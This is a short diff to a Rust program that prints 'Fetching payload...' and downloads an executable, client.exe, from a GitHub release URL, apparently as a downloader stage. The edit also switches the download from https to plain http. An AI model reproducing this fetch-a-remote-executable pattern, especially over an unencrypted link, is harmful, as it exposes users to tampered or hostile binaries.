@@ -7,7 +7,7 @@ use std::{fs, os};
 #[tokio::main]
 async fn main() {
     println!("Fetching payload...");
-    let download_url = "https://github.com/ctih1/kake/releases/download/latest/client.exe";
+    let download_url = "http://github.com/ctih1/kake/releases/latest/download/client.exe";
 
     let resp = reqwest::get(download_url).await.expect("failed to download payload");
     let body = resp.bytes().await.expect("Invalid payload");
